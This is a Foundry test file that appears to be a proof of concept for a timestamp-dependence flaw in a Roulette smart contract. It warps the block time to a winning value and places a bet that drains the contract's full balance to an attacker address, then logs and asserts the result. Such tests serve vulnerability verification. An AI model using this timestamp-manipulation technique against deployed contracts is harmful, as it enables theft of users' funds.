// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract Roulette_Drain_Test is Test {
    Roulette public roulette;
    address public victim = address(0x1234);
    address public attacker = address(0xABCD);
    uint256 public constant WIN_TS = 15;

    function setUp() public {
        // Deploy roulette contract with victim funds
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        roulette = new Roulette{value: 10 ether}();

        // Fund attacker for bet
        vm.deal(attacker, 10 ether);
    }

    function test_drain_contract_balance() public {
        uint256 initialVictimBalance = victim.balance;  // Keep only for final assertion

        console.log("\n--- BEFORE-Trigger ---");
        // Capture pre-attack state
        uint256 preContractBalance = address(roulette).balance;
        uint256 preAttackerBalance = attacker.balance;
        uint256 preTotalGames = roulette.totalGames();
        uint256 preTotalWinners = roulette.totalWinners();
        uint256 preAttackerWins = roulette.playerWins(attacker);
        
        console.log("Contract Balance: %s wei", preContractBalance);
        console.log("Attacker Balance: %s wei", preAttackerBalance);
        console.log("Total Games: %s", preTotalGames);
        console.log("Total Winners: %s", preTotalWinners);
        console.log("Attacker Wins: %s", preAttackerWins);

        console.log("\n--- Trigger: attacker.placeBet(warp=%s) ---", WIN_TS);
        // Execute the vulnerability exploit
        vm.warp(WIN_TS);
        vm.prank(attacker);
        roulette.placeBet{value: 10 ether}();

        console.log("\n--- AFTER-Trigger ---");
        // Capture post-attack state
        uint256 postContractBalance = address(roulette).balance;
        uint256 postAttackerBalance = attacker.balance;
        uint256 postTotalGames = roulette.totalGames();
        uint256 postTotalWinners = roulette.totalWinners();
        uint256 postAttackerWins = roulette.playerWins(attacker);
        
        console.log("Contract Balance: %s wei", postContractBalance);
        console.log("Attacker Balance: %s wei", postAttackerBalance);
        console.log("Total Games: %s", postTotalGames);
        console.log("Total Winners: %s", postTotalWinners);
        console.log("Attacker Wins: %s", postAttackerWins);

        console.log("\n--- State Change Analysis ---");
        // Evaluate state changes directly in logs
        console.log("Contract drained: %s", postContractBalance == 0 ? "YES" : "NO");
        console.log("Attacker profited: %s", postAttackerBalance > preAttackerBalance ? "YES" : "NO");
        console.log("Game stats changed: %s", 
            (postTotalGames > preTotalGames && postAttackerWins > preAttackerWins) ? "YES" : "NO");

        // Final vulnerability verdict
        console.log("\nFinal verdict:");
        bool vulnExists = (postContractBalance == 0) && (postAttackerBalance > preAttackerBalance);
        if (vulnExists) {
            console.log("Vulnerability Exists: Attacker drained contract balance & profited");
        } else {
            console.log("Vulnerability not Exist: Contract funds not drained or insufficient profit");
        }

        // Original verification assertions
        assertEq(
            address(roulette).balance,
            0,
            "All funds should be drained"
        );
        assertGt(
            attacker.balance,
            10 ether,
            "Attacker should have won contract balance"
        );
        assertEq(
            victim.balance,
            initialVictimBalance,
            "Victim should lose deposited funds"
        );
    }
}